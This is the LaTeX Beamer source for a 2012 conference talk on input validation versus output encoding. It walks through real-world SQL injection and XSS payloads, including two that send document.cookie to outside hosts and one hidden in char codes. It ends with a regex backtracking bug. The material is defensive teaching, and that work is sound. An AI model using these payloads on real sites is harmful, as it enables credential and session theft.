\documentclass{beamer}

\mode<presentation>
{
  \usetheme{Copenhagen}

  \setbeamercovered{transparent}

}

\beamertemplatenavigationsymbolsempty

\definecolor{f2elblue}{RGB}{97,97,97}%{49,72,87}
\definecolor{dark-green}{RGB}{40,150,21}
\definecolor{light-gray}{gray}{0.85}
\definecolor{med-gray}{gray}{0.75}

\setbeamercolor{title in head/foot}{bg=orange!90!black,fg=white}
\setbeamercolor{author in head/foot}{bg=black,fg=white}
\setbeamercolor{subsection in head/foot}{bg=black!95,fg=white}
\setbeamercolor{structure}{fg=black}

\setbeamerfont{frametitle}{family=\rmfamily,shape=\itshape,size={\fontsize{14}{12}}}

\setbeamertemplate{blocks}[rounded][shadow=false]

\setbeamertemplate{footline}%
{%
  \leavevmode%
  \hbox{%
    \begin{beamercolorbox}[wd=.45\paperwidth,ht=2.9ex,dp=1.125ex,leftskip=.3cm plus1fill,rightskip=.3cm]{author in head/foot}%
      \usebeamerfont{author in head/foot}\insertdate%
    \end{beamercolorbox}%
    \begin{beamercolorbox}[wd=.51\paperwidth,ht=2.9ex,dp=1.125ex,leftskip=.3cm,rightskip=.3cm plus1fil]{title in head/foot}%
      \usebeamerfont{title in head/foot}\insertshorttitle%
    \end{beamercolorbox}}%
    \begin{beamercolorbox}[wd=.04\paperwidth,ht=2.9ex,dp=1.125ex,center,leftskip=3pt plus1fill,rightskip=4pt]{author in head/foot}%
      \usebeamerfont{author in head/foot}\insertframenumber%
    \end{beamercolorbox}%
  \vskip0pt%
}%

\usepackage[english]{babel}

\usepackage[latin1]{inputenc}

\usepackage{times}
\usepackage[T1]{fontenc}

\usepackage{ulem}

\author{Philip Tellis / \texttt{philip@lognormal.com}}

\title{Is What You Get, What You Expect to Get?}

\date{\href{http://confoo.ca/}{ConFoo.ca} / 2012-03-01}


\pgfdeclareimage[height=0.5cm]{bluesmoon-logo}{../ui/default/bodybg}
\pgfdeclareimage[height=11pt]{cc-licence}{../by-nc-sa-3.0-88x31}
\logo{\pgfuseimage{cc-licence}}


%%%% Begin defining new commands for this template

% Serial number in slide title
\newcommand{\sn}[1]{\textrm{\textit{\Huge{\raisebox{-3pt}[4pt][8pt]{\textcolor{f2elblue}{#1}}}}}\hspace{4pt}}
% large Centered Italic Roman text within a slide (building block for the following)
\newcommand{\innersplash}[1]{
  \begin{center}
    \large \textrm{\textit{ #1 } }
  \end{center}
}
% Slide that has just one large centered thing to say
\newcommand{\splashslide}[2][{}]{
  \begin{frame}
  \frametitle{#1}
  \innersplash{#2}
  \end{frame}
}
% Leadin slide at the start of a problem/section
\newcommand{\leadinslide}[2]{
  \splashslide{
     {\fontsize{150}{20}\selectfont{\raisebox{0pt}[90pt][0pt]{\textcolor{light-gray}{#1}}}} \\ \huge \textcolor{gray}{#2}
  }
}
% Suggested fix at the end of a problem
\newcommand{\suggestedfix}[2]{
  \splashslide[\sn{#1} Suggested fix]{{#2}}
}
% Syntax highlighting
\def\codeem<#1>#2{\textcolor<#1>{brown}{\textbf<#1>{#2}}}
\def\jsem<#1>#2{\textcolor<#1>{dark-green}{\textbf<#1>{#2}}}
\def\phpem<#1>#2{\textcolor<#1>{blue}{\textbf<#1>{#2}}}
\def\htmlem<#1>#2{\textcolor<#1>{purple}{\textbf<#1>{#2}}}
\def\negem<#1>#2{\textcolor<#1>{red}{\textbf<#1>{#2}}}
\def\brown<#1>#2{\textcolor<#1>{brown}{\textbf<#1>{#2}}}
\def\green<#1>#2{\textcolor<#1>{dark-green}{\textbf<#1>{#2}}}
\def\blue<#1>#2{\textcolor<#1>{blue}{\textbf<#1>{#2}}}
\def\purple<#1>#2{\textcolor<#1>{purple}{\textbf<#1>{#2}}}
\def\red<#1>#2{\textcolor<#1>{red}{\textbf<#1>{#2}}}

%%%% End of new commands




\begin{document}

\begin{frame}
  \titlepage
\end{frame}

\splashslide{IWYGWYETG}


\setbeamertemplate{background}{
  \parbox[c][\paperheight]{\paperwidth}{
    \hfill \pgfimage[height=\paperheight]{../bluesmoon}
  }
}
\begin{frame}{\textit{\$ finger philip}}
  \begin{itemize}
  \item Philip Tellis
  \item \small{\texttt{philip@lognormal.com}}
  \item \href{http://twitter.com/bluesmoon}{@bluesmoon}
  \item geek - paranoid - speedfreak
  \item co-founder \href{http://www.lognormal.com/}{Log-Normal}
  \item \href{http://bluesmoon.info/}{http://bluesmoon.info/}
  \end{itemize}
\end{frame}
\setbeamertemplate{background}{}


\begin{frame}
\begin{center}
\textsc{\Huge Warning!}
\end{center}
\vspace{0.5cm}
\small
This presentation may contain unreadable code.  Attempting to read it
is probably not worthwhile.  Definitely not at 08:30.  Screaming \textbf{WTF!!1!}
probably is.
\end{frame}

\splashslide{\Large{How do you distinguish code from data?}}

\splashslide{\Huge{\texttt{< > ' " $\textbackslash$ \& \% `}}}

\setbeamertemplate{background}{
  \parbox[c][\paperheight]{0.9\paperwidth}{
    \hfill \pgfimage[width=0.8\paperwidth]{exploits_of_a_mom}
  }
}
\begin{frame}
\frametitle{Failure to tell the difference\ldots}
\end{frame}
\setbeamertemplate{background}{}

\splashslide{\Large Note: This talk is NOT about XSS or SQLi, \\ but it might seem like it}

\splashslide{Let's look at a few examples}

\begin{frame}[fragile]
\begin{semiverbatim}
http://xxyyzz.com/forms/contact\_form.asp?i=
  0\%27\%20UNION\%20ALL\%20SELECT\%201,2,3,4,5,\%28
  \%27\%3c\%28\%20\%27\%2buserId\%29,\%28firstname
  \%2b\%27\%20\%27\%2blastname\%29,\%28address\%2b
  \%27\%20city:\%27\%2bcity\%29,9,10,11,12,13,14,15,16,
  \%28email\%2b\%27\%20--Password:\%20\%27\%27
  \%2buserpwd\%2b\%27\%20\%29\%3e\%27\%29,18,19,20,21,
  22,23,24,25,26,27,28,29,30\%20FROM\%20
\end{semiverbatim}  
\end{frame}

\begin{frame}[fragile]
\begin{semiverbatim}
http://xxyyzz.com/forms/contact\_form.asp?i=
  0'     UNION   ALL   SELECT   1,2,3,4,5, ( 
  '   <  (     '  + userId ) , ( firstname
  +   '     '  + lastname ) , ( address + 
  '     city: '  + city ) ,9,10,11,12,13,14,15,16,
   ( email +  '    --Password:    '  '
  +  userpwd +  '     )  >  '  ) ,18,19,20,21,
  22,23,24,25,26,27,28,29,30   FROM   
\end{semiverbatim}  
\end{frame}

\splashslide{Expected a positive integer, but got more than that}

\begin{frame}[fragile]
\begin{semiverbatim}
  <?php
  \codeem<1>{\$id} = htmlspecialchars(\$\_GET[ \codeem<1>{'id'} ]);
  ?>
  ...
  value : \phpem<1>{<?php echo (\$id) ? \codeem<1>{\$id} : 'null'; ?>}
\end{semiverbatim}
\vspace{0.4cm}
\innersplash{This is JavaScript code generated by PHP}
\end{frame}

\begin{frame}[fragile]
\begin{semiverbatim}
  \codeem<2>{id}=\codeem<3>{\%3Cscript\%3E}document.location=\%27
    http://www.silic0n.byethost8.com/index.php
    ?isr=\%27\%20+escape(document.cookie)
    \codeem<3>{\%3C/script\%3E}
\end{semiverbatim}
\begin{itemize}
\item<2-> \$id should have been an integer
\item<3-> A bug in this attack rendered it unsuccessful
\end{itemize}
\end{frame}

\splashslide{Expected a positive integer, but got more than that}

\begin{frame}[fragile]
\begin{semiverbatim}
               \only<3>{\red<3->{use the quotes luke}}
<a             \only<3>{\red<3->{     "}}
   <?php echo 'href=\codeem<2->{/stock\_price?f=}' . 
        htmlspecialchars(\$\_GET['f']);
   ?>
>
\end{semiverbatim}
\end{frame}

\begin{frame}[fragile]
\begin{semiverbatim}
 /stock\_price?f=ACDD\codeem<1>{\%20}\codeem<2>{STYLE=x:expression(}
  document.write(String.fromCharCode(\textcolor{med-gray}{\tiny{\codeem<3>{
     60,105,109,103,32,115,114,99,61,120,32,111,110,101,114,114,111,114,61,40,100,111,99,
     117,109,101,110,116,46,108,111,99,97,116,105,111,110,61,39,104,116,116,112,58,47,47,
     115,116,97,110,100,97,114,100,51,51,46,102,114,101,101,104,111,115,116,105,97,46,99,
     111,109,47,67,83,47,108,103,46,112,104,112,63,105,110,102,111,61,39,43,101,15,99,97,
     112,101,40,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,41,41,62
}}}  )))
\end{semiverbatim}
\end{frame}

\begin{frame}[fragile]
The char codes translate to:
\begin{semiverbatim}
<img src=x onerror=(document.location='
  http://standard33.freehostia.com/CS/lg.php?info='
  +\red<1->{escape(document.cookie)})>
\end{semiverbatim}
\begin{itemize}
\item \texttt{\$f} was html encoded, but used unquoted as an attribute value.
\item Remember that spaces are never encoded.
\end{itemize}
\end{frame}

\splashslide{Expected a stock symbol, but got more than that}

\begin{frame}[fragile]
\begin{semiverbatim}
\scriptsize{
 <?php
   \codeem<6>{\$host}=htmlspecialchars(\$\_REQUEST['h'], ENT\_QUOTES);
 ?>
 ...
 \jsem<3-5>{var \codeem<6>{host}} = "\phpem<2-5>{<?php echo \codeem<6>{\$host} ?>}";
 var div = document.getElementById("l");
 \htmlem<5>{div.innerHTML} = "<a href=\\"http://xxx.xx.com/gethost?h=\\""
    + \codeem<6>{\jsem<4-5>{host}} + ">" + \codeem<6>{\jsem<4-5>{host}} + "</a>";}
\end{semiverbatim}
\begin{itemize}
  \item Notice the different contexts
  \item What's special (meta) to one language but not the other?
\end{itemize}
\end{frame}

\begin{frame}[fragile]
\begin{semiverbatim}
\scriptsize{
\only<1>{  h=\\u0022\\u003e\\u003cimg\\u0020src\\u003d\\u0022foo\\u0022\\u0020
    onerror\\u003d\\u0022alert(\\u0027xss\\u0027)}\only<2>{  h=   "     >     <  img      src   =     "  foo   "        
    onerror   =     "  alert(  '   xss   '  )}\only<3>{  h="><img src="foo"
    onerror="alert('xss')}
}
\end{semiverbatim}
\end{frame}

\splashslide{Expected a hostname, but got something completely different}

\begin{frame}[fragile]
\frametitle{Dear IE6}
\begin{semiverbatim}
<input value="\only<1-2>{[e0]"> }\only<3>{}"onmouseover=alert(0) >
    \only<2>{\red<2>{That's 0xe0, start of 3 byte seq}}
\end{semiverbatim}
\end{frame}

\splashslide{Expected valid UTF-8, got invalid UTF-8}

\splashslide{So what's the common theme here?}

\splashslide{Should I be Validating Input or Encoding Output?}

\splashslide{They solve two different problems, and you need both}

\splashslide{Output Encoding (done automatically by your framework) protects your users from XSS}

\splashslide{Input Validation is a data quality issue}

\splashslide{\Large Is the input you get from a user of the type and range that you expect it to be?}

\splashslide{Sometimes it results in back end code injection}

\splashslide{But it always results in bad data}

\splashslide{Bonus Example: This hit me in production yesterday}

\begin{frame}[fragile]
\frametitle{regex to check if text was a subdomain of a known domain}
\begin{semiverbatim}
re=\blue<1>{new} \green<1>{RegExp}('\textasciicircum(?:[\textasciicircum\\.]+\\.)*' + dom + '\$', 'i');

re.exec(ref)
\end{semiverbatim}
\end{frame}

\begin{frame}[fragile]
\frametitle{Sometimes IE8 will serve requests from a .mht file}
\begin{verbatim}
mhtml:file://C:\Users\blah-blah-blah.mht
\end{verbatim}
\end{frame}

\splashslide{I expected the regex to reject this text}
\splashslide{What I got was 100\% CPU spent in regex backtracking}

\splashslide{\LARGE ;(}

\splashslide{Unrelated Bonus Example: From a WordPress theme}

\begin{frame}[fragile]
\begin{semiverbatim}
\small
<?php
  \$value=htmlspecialchars(\$\_GET['value'], ENT\_QUOTES);
?>
<input type="text"
   value="\phpem<1->{<?php echo \$value ?>}"
   onfocus="\jsem<1->{if}(\jsem<1->{this.value}=='\phpem<1->{<?php echo \$value ?>}')
               \{\jsem<1->{this.value} = '{}';\}" />
\end{semiverbatim}
\end{frame}

\begin{frame}[fragile]
\begin{semiverbatim}
\small
\textcolor<2->{light-gray}{<input type="text"
   value="\phpem<1-2>{&#39;+alert(/xss/)+&#39;}"
   onfocus="}\jsem<1->{if}(\jsem<1->{this.value}==\htmlem<2->{'\only<1-2>{\phpem<1>{&#39;}}\only<3>{'    }}\phpem<1>{+}\phpem<1->{alert(/xss/)}\phpem<1>{+}\htmlem<2->{\only<3>{    '}\phpem<1>{\only<1-2>{&#39;}}'})
               \{\jsem<1->{this.value} = '{}';\}\textcolor<2->{light-gray}{" />}
\end{semiverbatim}
\vspace{0.4cm}
\innersplash{Inside an \jsem<1->{\texttt{on*}} handler, html entities are decoded before they are passed on to JavaScript}
\end{frame}

\splashslide{\LARGE I have no idea what was expected here}

\splashslide{\LARGE Questions?}

\setbeamertemplate{background}{
  \parbox[c][\paperheight]{\paperwidth}{
    \hfill \pgfimage[height=\paperheight]{../bluesmoon}
  }
}
\begin{frame}{Contact me}
  \begin{itemize}
  \item Philip Tellis
  \item \small{\texttt{philip@lognormal.com}}
  \item \href{http://twitter.com/bluesmoon}{@bluesmoon}
  \item geek - paranoid - speedfreak
  \item co-founder \href{http://www.lognormal.com/}{Log-Normal}
  \item \href{http://bluesmoon.info/}{http://bluesmoon.info/}
  \item \href{http://www.slideshare.net/bluesmoon}{slideshare.net/bluesmoon}
  \end{itemize}
\end{frame}
\setbeamertemplate{background}{}

\end{document}


